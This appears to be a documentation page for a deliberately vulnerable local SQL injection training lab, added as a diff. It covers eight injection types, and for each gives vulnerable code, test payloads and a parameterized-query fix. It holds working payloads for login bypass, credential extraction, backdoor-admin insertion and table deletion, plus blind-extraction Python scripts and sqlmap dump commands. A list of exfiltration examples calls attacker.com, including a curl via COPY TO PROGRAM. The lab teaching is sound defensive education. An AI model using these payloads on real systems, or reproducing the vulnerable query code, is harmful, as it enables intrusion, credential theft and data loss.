@@ -1,0 +1,398 @@
+{% extends "base.html" %}
+
+{% block title %}Documentation - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div style="text-align: center; padding: 20px;">
+        <h1 class="section-title">📚 SQL Injection Lab Documentation</h1>
+        <p class="section-subtitle">Complete reference guide for all 8 vulnerability types</p>
+    </div>
+</div>
+
+<!-- Vulnerability 1 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">1️⃣ Classic SQL Injection (Authentication Bypass)</span>
+        <span class="badge badge-danger">Critical</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>POST /login</code><br>
+        <strong>Root Cause:</strong> String concatenation in authentication query without parameterization.
+    </p>
+    <pre><code># Vulnerable Code (app.py)
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.execute(query).fetchone()</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Bypass password check</div>
+            Username: <strong>admin' --</strong> | Password: anything
+        </div>
+        <div class="payload">
+            <div class="payload-label">Universal true condition</div>
+            Username: <strong>' OR '1'='1' --</strong> | Password: anything
+        </div>
+        <div class="payload">
+            <div class="payload-label">Login as first user with LIMIT</div>
+            Username: <strong>' OR '1'='1' LIMIT 1 --</strong> | Password: anything
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(63, 185, 80, 0.05); border-radius: 8px; border: 1px solid rgba(63, 185, 80, 0.2);">
+        <strong style="color: var(--success);">🔒 Fix:</strong> Use parameterized queries<br>
+        <code style="font-size: 12px;">db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))</code>
+    </div>
+</div>
+
+<!-- Vulnerability 2 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">2️⃣ Union-Based SQL Injection</span>
+        <span class="badge badge-danger">Critical</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /search?q=...</code><br>
+        <strong>Root Cause:</strong> User input concatenated into SELECT query, allowing UNION to combine results from other tables.
+    </p>
+    <pre><code># Vulnerable Code
+query = "SELECT id, name, description, price, category FROM products WHERE name LIKE '%" + query_param + "%'"</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Extract all users (must match 5 columns)</div>
+            <strong>' UNION SELECT id, username, password, email, role FROM users --</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Extract secrets/CTF flag</div>
+            <strong>' UNION SELECT id, secret_key, secret_value, description, 'secrets' FROM secrets --</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Discover database schema</div>
+            <strong>' UNION SELECT null, name, sql, null, type FROM sqlite_master --</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(63, 185, 80, 0.05); border-radius: 8px; border: 1px solid rgba(63, 185, 80, 0.2);">
+        <strong style="color: var(--success);">🔒 Fix:</strong> Parameterized queries prevent UNION injection<br>
+        <code style="font-size: 12px;">db.execute("SELECT * FROM products WHERE name LIKE ?", ('%' + q + '%',))</code>
+    </div>
+</div>
+
+<!-- Vulnerability 3 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">3️⃣ Error-Based SQL Injection</span>
+        <span class="badge badge-danger">High</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /profile/&lt;user_id&gt;</code><br>
+        <strong>Root Cause:</strong> Unsanitized input in query where SQL errors reveal database structure information.
+    </p>
+    <pre><code># Vulnerable Code
+query = "SELECT * FROM users WHERE id = " + user_id
+result = db.execute(query).fetchone()</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Trigger syntax error to see query structure</div>
+            <strong>/profile/1'</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Column count discovery via UNION</div>
+            <strong>/profile/1 AND 1=2 UNION SELECT null, null, null, null, null --</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Conditional error (division by zero)</div>
+            <strong>/profile/1 AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(63, 185, 80, 0.05); border-radius: 8px; border: 1px solid rgba(63, 185, 80, 0.2);">
+        <strong style="color: var(--success);">🔒 Fix:</strong> Parameterized queries + generic error messages<br>
+        <code style="font-size: 12px;">db.execute("SELECT * FROM users WHERE id = ?", (user_id,))</code>
+    </div>
+</div>
+
+<!-- Vulnerability 4 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">4️⃣ Boolean-Based Blind SQL Injection</span>
+        <span class="badge badge-danger">High</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /check-order?id=...</code><br>
+        <strong>Root Cause:</strong> Query result affects visible page content (True = order found, False = not found).
+    </p>
+    <pre><code># Vulnerable Code
+query = "SELECT * FROM orders WHERE id = " + order_id
+result = db.execute(query).fetchone()</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Check if admin password starts with 'a'</div>
+            <strong>1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1 ELSE 1/0 END)=1</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Check password length > 5</div>
+            <strong>1 AND (SELECT length(password) FROM users WHERE username='admin') > 5</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(88, 166, 255, 0.05); border-radius: 8px; border: 1px solid rgba(88, 166, 255, 0.2);">
+        <strong style="color: var(--info);">🔬 Automation Script (Python):</strong>
+        <pre style="margin-top: 8px; font-size: 11px;"><code>import requests
+
+url = "http://127.0.0.1:5000/check-order"
+password = ""
+for i in range(1, 20):
+    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
+        payload = f"1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),{i},1)='{char}') THEN 1 ELSE 1/0 END)=1"
+        r = requests.get(url, params={"id": payload})
+        if "Order Found" in r.text:
+            password += char
+            print(f"Found char {i}: {char}")
+            break
+    else:
+        break
+print(f"Password: {password}")</code></pre>
+    </div>
+</div>
+
+<!-- Vulnerability 5 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">5️⃣ Time-Based Blind SQL Injection</span>
+        <span class="badge badge-danger">High</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /report?id=...</code><br>
+        <strong>Root Cause:</strong> Query execution time can be controlled via SQL functions. SQLite uses <code>randomblob(N)</code> to cause delays.
+    </p>
+    <pre><code># Vulnerable Code
+query = "SELECT * FROM products WHERE id = " + product_id
+result = db.execute(query).fetchone()</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Cause delay if password starts with 'a'</div>
+            <strong>1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN randomblob(1000000000) ELSE 1 END)</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Heavy delay for True condition</div>
+            <strong>1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin') > 0 THEN randomblob(500000000) ELSE 1 END)</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(88, 166, 255, 0.05); border-radius: 8px; border: 1px solid rgba(88, 166, 255, 0.2);">
+        <strong style="color: var(--info);">🔬 Automation Script (Python):</strong>
+        <pre style="margin-top: 8px; font-size: 11px;"><code>import requests, time
+
+url = "http://127.0.0.1:5000/report"
+password = ""
+for i in range(1, 20):
+    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
+        payload = f"1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),{i},1)='{char}') THEN randomblob(100000000) ELSE 1 END)"
+        start = time.time()
+        r = requests.get(url, params={"id": payload})
+        elapsed = time.time() - start
+        if elapsed > 1.0:  # Delay detected = True
+            password += char
+            print(f"Found char {i}: {char} (delay: {elapsed:.2f}s)")
+            break
+    else:
+        break
+print(f"Password: {password}")</code></pre>
+    </div>
+</div>
+
+<!-- Vulnerability 6 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">6️⃣ Out-of-Band SQL Injection (Simulated)</span>
+        <span class="badge badge-danger">Medium</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /api/stats?id=...</code><br>
+        <strong>Concept:</strong> In real scenarios, databases make network requests (DNS/HTTP) to exfiltrate data. SQLite simulates this via query result manipulation.
+    </p>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Simulated Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Exfiltrate passwords into log results</div>
+            <strong>1 UNION SELECT id, 'EXFIL_' || username, password, 'data_exfil' FROM users</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Extract CTF flag</div>
+            <strong>1 UNION SELECT id, 'FLAG_' || secret_key, secret_value, 'exfiltrated' FROM secrets</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(240, 136, 62, 0.05); border-radius: 8px; border: 1px solid rgba(240, 136, 62, 0.2);">
+        <strong style="color: var(--warning);">🌐 Real-World OOB Examples:</strong>
+        <ul style="margin-top: 8px; padding-left: 20px; font-size: 12px; line-height: 1.8;">
+            <li><strong>MySQL:</strong> <code>LOAD_FILE(CONCAT('\\attacker.com\', password, '.dns.log'))</code></li>
+            <li><strong>MSSQL:</strong> <code>EXEC master..xp_dirtree '\\attacker.com\test'</code></li>
+            <li><strong>Oracle:</strong> <code>UTL_HTTP.request('http://attacker.com/' || password)</code></li>
+            <li><strong>PostgreSQL:</strong> <code>COPY (SELECT password FROM users) TO PROGRAM 'curl attacker.com'</code></li>
+        </ul>
+    </div>
+</div>
+
+<!-- Vulnerability 7 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">7️⃣ Second-Order SQL Injection</span>
+        <span class="badge badge-danger">High</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoints:</strong> <code>POST /feedback</code> (storage) → <code>GET /admin/feedback</code> (execution)<br>
+        <strong>Root Cause:</strong> Input stored safely in one query, but later used unsafely in another query.
+    </p>
+    <pre><code># Storage Phase (/feedback) - INSERT is also vulnerable
+query = "INSERT INTO feedback (name, email, message) VALUES ('" + name + "', '" + email + "', '" + message + "')"
+
+# Execution Phase (/admin/feedback) - WHERE the stored payload executes!
+query = "SELECT * FROM feedback WHERE name = '" + name_filter + "'"</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Attack Flow:</strong>
+        <ol style="padding-left: 20px; color: var(--text-muted); font-size: 13px; line-height: 1.8; margin-top: 8px;">
+            <li>Submit payload via <code>/feedback</code> form Name field: <code>' OR '1'='1' --</code></li>
+            <li>Payload is stored in database (appears harmless)</li>
+            <li>Admin visits <code>/admin/feedback</code> and the stored name is used in a vulnerable query</li>
+            <li>Query becomes: <code>SELECT * FROM feedback WHERE name = '' OR '1'='1' --'</code></li>
+            <li>All feedback entries returned, including unapproved ones!</li>
+        </ol>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(63, 185, 80, 0.05); border-radius: 8px; border: 1px solid rgba(63, 185, 80, 0.2);">
+        <strong style="color: var(--success);">🔒 Fix:</strong> Sanitize at point of use, not just at storage. Use parameterized queries everywhere.<br>
+        <code style="font-size: 12px;">db.execute("SELECT * FROM feedback WHERE name = ?", (name_filter,))</code>
+    </div>
+</div>
+
+<!-- Vulnerability 8 -->
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">8️⃣ Stacked Queries SQL Injection</span>
+        <span class="badge badge-danger">Critical</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <strong>Endpoint:</strong> <code>GET /admin?filter=...</code><br>
+        <strong>Root Cause:</strong> Uses <code>executescript()</code> which allows multiple SQL statements separated by semicolons.
+    </p>
+    <pre><code># Vulnerable Code - executescript() allows multiple statements!
+query = "SELECT * FROM logs WHERE " + log_filter
+cursor = db.executescript(query)</code></pre>
+    <div style="margin-top: 16px;">
+        <strong style="color: var(--text-muted); font-size: 12px; text-transform: uppercase;">Test Payloads:</strong>
+        <div class="payload" style="margin-top: 8px;">
+            <div class="payload-label">Add backdoor admin account</div>
+            <strong>1=1; INSERT INTO users (username, password, email, role) VALUES ('hacker', 'hacked123', 'hacker@evil.com', 'admin'); --</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Promote user to admin</div>
+            <strong>1=1; UPDATE users SET role='admin' WHERE username='alice'; --</strong>
+        </div>
+        <div class="payload">
+            <div class="payload-label">Delete all data (destructive)</div>
+            <strong>1=1; DELETE FROM orders; --</strong> or <strong>1=1; DROP TABLE feedback; --</strong>
+        </div>
+    </div>
+    <div style="margin-top: 16px; padding: 12px; background: rgba(63, 185, 80, 0.05); border-radius: 8px; border: 1px solid rgba(63, 185, 80, 0.2);">
+        <strong style="color: var(--success);">🔒 Fix:</strong> Never use <code>executescript()</code> with user input. Use <code>execute()</code> with single statements and parameters.<br>
+        <code style="font-size: 12px;">db.execute("SELECT * FROM logs WHERE action = ?", (action_filter,))</code>
+    </div>
+</div>
+
+<!-- Testing with sqlmap -->
+<div class="card" style="border-color: var(--accent);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--accent);">🤖 Automated Testing with sqlmap</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        <a href="https://sqlmap.org" target="_blank" style="color: var(--accent);">sqlmap</a> is an open-source penetration testing tool that automates SQL injection detection and exploitation.
+    </p>
+    <pre><code># Install sqlmap
+pip install sqlmap
+
+# Test login form (Classic SQLi)
+sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=test" --level=5 --risk=3
+
+# Test search parameter (Union-Based SQLi)
+sqlmap -u "http://127.0.0.1:5000/search?q=test" --level=5 --risk=3
+
+# Test profile endpoint (Error-Based SQLi)
+sqlmap -u "http://127.0.0.1:5000/profile/1" --level=5 --risk=3
+
+# Dump all tables and data
+sqlmap -u "http://127.0.0.1:5000/search?q=test" --dump-all
+
+# Get current database user
+sqlmap -u "http://127.0.0.1:5000/search?q=test" --current-user
+
+# Get database banner (version)
+sqlmap -u "http://127.0.0.1:5000/search?q=test" --banner
+
+# Test time-based blind SQLi
+sqlmap -u "http://127.0.0.1:5000/report?id=1" --technique=T --level=5
+
+# Test boolean-based blind SQLi
+sqlmap -u "http://127.0.0.1:5000/check-order?id=1" --technique=B --level=5</code></pre>
+</div>
+
+<!-- Browser Testing -->
+<div class="card" style="border-color: var(--accent);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--accent);">🌐 Manual Browser Testing Guide</span>
+    </div>
+    <table class="data-table" style="margin-top: 0;">
+        <thead>
+            <tr>
+                <th>Vulnerability</th>
+                <th>URL / Action</th>
+                <th>Expected Result</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Classic SQLi</td>
+                <td>POST /login with <code>admin' --</code></td>
+                <td>Logged in as admin without password</td>
+            </tr>
+            <tr>
+                <td>Union-Based</td>
+                <td>GET /search?q=<code>' UNION SELECT * FROM users --</code></td>
+                <td>User credentials appear in product list</td>
+            </tr>
+            <tr>
+                <td>Error-Based</td>
+                <td>GET /profile/<code>1'</code></td>
+                <td>SQL syntax error displayed</td>
+            </tr>
+            <tr>
+                <td>Boolean Blind</td>
+                <td>GET /check-order?id=<code>1 AND 1=1</code> vs <code>1 AND 1=2</code></td>
+                <td>Different page content (found vs not found)</td>
+            </tr>
+            <tr>
+                <td>Time-Based Blind</td>
+                <td>GET /report?id=<code>1 AND randomblob(100000000)</code></td>
+                <td>Noticeable response delay</td>
+            </tr>
+            <tr>
+                <td>OOB (Simulated)</td>
+                <td>GET /api/stats?id=<code>1 UNION SELECT * FROM secrets</code></td>
+                <td>Secret data in API response</td>
+            </tr>
+            <tr>
+                <td>Second-Order</td>
+                <td>POST /feedback (store) → GET /admin/feedback (trigger)</td>
+                <td>Stored payload executes in admin query</td>
+            </tr>
+            <tr>
+                <td>Stacked Queries</td>
+                <td>GET /admin?filter=<code>1=1; INSERT INTO users...</code></td>
+                <td>New data appears in database</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<div style="text-align: center; padding: 20px;">
+    <a href="{{ url_for('index') }}" class="btn btn-primary">← Back to Lab Home</a>
+</div>
+{% endblock %}
